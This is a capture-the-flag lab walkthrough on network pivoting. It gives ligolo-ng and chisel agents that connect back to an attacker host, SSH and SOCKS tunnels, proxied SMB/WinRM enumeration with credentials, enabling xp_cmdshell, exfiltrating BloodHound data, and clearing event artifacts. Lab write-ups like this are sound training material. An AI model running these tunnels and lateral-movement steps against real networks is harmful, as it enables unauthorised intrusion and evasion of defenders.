---
layout: writeup
name: "PivotSmarter"
platform: "HackSmarter"
category: "hacksmarter"
difficulty: "Easy"
permalink: /writeups/hacksmarter/pivotsmarter/
date: 2025-11-12
pwned: true
---
# PivotSmarter — HackSmarter Lab (Full Write‑Up)

[![Platform](https://img.shields.io/badge/Platform-HackSmarter-blue)](#) [![Category](https://img.shields.io/badge/Category-Pivoting%20%26%20Internal%20Recon-orange)](#) [![Difficulty](https://img.shields.io/badge/Difficulty-Medium-lightgrey)](#)

Public walkthroughs are allowed for HackSmarter, so this is the **full** write‑up.

---

## 📌 TL;DR
- Establish a **SOCKS** or **TUN** pivot from the foothold.
- Enumerate internal subnets from your box (not from inside the victim shell).
- Chain pivots where needed (multi‑hop) and keep routes clean.
- Use built‑ins where you can (SSH, netsh) and standardized agents (ligolo‑ng / chisel) elsewhere.
- Validate AD/host reachability, then execute with minimal noise.

---

## 🗺️ Lab Topology (conceptual)
```text
Attacker (10.200.0.228)
  └─[FOOTHOLD 1] 10.10.10.0/24
     └─[INTERNAL 2] 10.10.20.0/24
        └─[CORE/AD/DC] 10.10.30.0/24
```
*Subnets are illustrative—replace with the actual ranges discovered in your run.*

---

## 🧰 Tooling Quickstart
- **ligolo‑ng** (SOCKS or TUN mode) – recommended for stable, multi‑hop pivots
- **chisel** (SOCKS or TCP port‑forward) – lightweight alternative
- **SSH** `-D` (SOCKS) / `-L` / `-R` – when SSH service is present
- **proxychains** (Linux) – route arbitrary tools via SOCKS5
- **nxc** (NetExec) – SMB/WinRM/MSSQL/RDP with `--proxy` support
- **nmap/rustscan** – scanning through proxies (selective ports), or raw via TUN
- **BloodHound/SharpHound** – AD graphing once you have creds/LDAP path

> Tip: prefer **TUN** for full‑stack tools (ICMP, LDAP signing detection, Kerberos), and **SOCKS** for quick web/SMB/WinRM reachability.

---

## 1) Initial Foothold
Perform standard recon to land a shell or creds on the first pivot host (FOOTHOLD 1). Common paths:
- Web → RCE / creds
- SSH with discovered credentials
- MSSQL/WinRM with low‑priv account

Once you have any execution path on FOOTHOLD 1, proceed to a **pivot**.

---

## 2) SOCKS Pivot (Quick)
### Option A: ligolo‑ng (SOCKS only)
**Attacker:**
```bash
./relay -laddr 0.0.0.0:11601 -autocert -socks 127.0.0.1:1080
```
**Foothold:**
```powershell
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```
**Proxychains (attacker):** edit `/etc/proxychains4.conf`:
```
socks5  127.0.0.1 1080
```
Run tools through the proxy:
```bash
proxychains -q nxc smb 10.10.20.0/24 -u '' -p '' --shares
proxychains -q crackmapexec winrm 10.10.20.25 -u user -p pass
```

### Option B: chisel (SOCKS)
**Attacker:**
```bash
chisel server -p 1080 --socks5
```
**Foothold:**
```bash
./chisel client <ATTACKER_IP>:1080 socks
```
Then use `proxychains` as above.

> Notes
> - Large `nmap` scans via SOCKS are unreliable; scan select ports (`-p 80,445,5985,3389`) or move to **TUN** mode.

---

## 3) TUN Pivot (Full IP routing)
### ligolo‑ng (recommended)
**Attacker:**
```bash
./relay -laddr 0.0.0.0:11601 -autocert -tun
sudo ip tuntap del dev ligolo mode tun 2>/dev/null || true
sudo ip tuntap add dev ligolo mode tun user $USER
sudo ip link set ligolo up
```
**Foothold:**
```powershell
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```
**Add routes (attacker):**
```bash
sudo ip route add 10.10.20.0/24 dev ligolo
sudo ip route add 10.10.30.0/24 dev ligolo
```
**Test:**
```bash
ping -c1 -I ligolo 10.10.20.25
nmap -e ligolo -Pn -n -T4 -p 80,445,5985,3389 10.10.20.0/24 --disable-arp-ping
```

### SSH native (if SSH is available on FOOTHOLD 1)
**SOCKS:**
```bash
ssh -N -D 1080 user@10.10.10.10
```
**L/R port‑forward:**
```bash
# forward remote 445 to local 8445
ssh -N -L 8445:10.10.20.25:445 user@10.10.10.10
```

---

## 4) Second Hop Pivot (FOOTHOLD 2 → INTERNAL 3)
If you compromise a second host inside, run another **ligolo agent** there and forward through the first session (`sessions` / `listen` in ligolo). Or daisy‑chain **chisel**:
```bash
# on FOOTHOLD 1 (as a relay)
./chisel server -p 9002 --reverse
# on FOOTHOLD 2
./chisel client 10.10.10.10:9002 R:socks
```

Maintain a **map** of what route hits which subnet and keep only the routes you need.

---

## 5) Enumeration & Lateral Movement
- **SMB/AD:** `nxc smb 10.10.20.0/24 -u user -p pass --shares --groups --sessions`
- **WinRM:** `nxc winrm 10.10.20.25 -u user -p pass -x "whoami /all"`
- **LDAP/ADCS:** via TUN, use `ldapsearch`, `Certify`, `Certipy`
- **BloodHound:** run SharpHound on a reachable Windows host; exfil to attacker
- **SQL:** `nxc mssql ...` (enable `xp_cmdshell` if appropriate to the lab)
- **RDP:** via TUN, `xfreerdp /v:10.10.20.25 /u:user /p:pass /dynamic-resolution`

> Tip: If DNS is internal, add a conditional forwarder on your box or `/etc/hosts` entries to resolve AD names while using TUN.

---

## 6) Common Troubleshooting
- **“Host seems down” over SOCKS:** prefer TUN for ICMP and ARP‑less scans. Add `-Pn --disable-arp-ping` to `nmap`.
- **No route / black hole:** check `ip route`, ensure the subnet matches the target’s netmask.
- **Proxy DNS leaks:** in `/etc/proxychains4.conf`, enable `proxy_dns` (and use SOCKS5).
- **Windows firewalls:** pivot via allowed egress (e.g., 443/tcp), or fall back to SSH if available.
- **Interface choice:** `nmap -e ligolo` selects the TUN; don’t mix with proxychains.

---

## 7) Cleanup
- Remove added routes: `sudo ip route del 10.10.20.0/24 dev ligolo`
- Bring down TUN: `sudo ip link set ligolo down && sudo ip tuntap del dev ligolo mode tun`
- Kill agents/relays and delete any dropped binaries
- Clear temp files and event artifacts where allowed by the lab

---

## 📝 Command Cheat Sheet
```bash
# ligolo SOCKS
./relay -laddr 0.0.0.0:11601 -autocert -socks 127.0.0.1:1080
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
proxychains -q nxc smb 10.10.20.0/24 -u '' -p '' --shares

# ligolo TUN
./relay -laddr 0.0.0.0:11601 -autocert -tun
sudo ip tuntap add dev ligolo mode tun user $USER && sudo ip link set ligolo up
sudo ip route add 10.10.20.0/24 dev ligolo

# chisel SOCKS
chisel server -p 1080 --socks5
./chisel client <ATTACKER_IP>:1080 socks

# ssh SOCKS
ssh -N -D 1080 user@10.10.10.10
```

---

## ✅ Notes
This guide focuses on **pivoting mechanics** and safe enumeration patterns. Apply your preferred exploitation paths once a target is reachable (SMB relay, WinRM, MSSQL, ADCS, etc.).

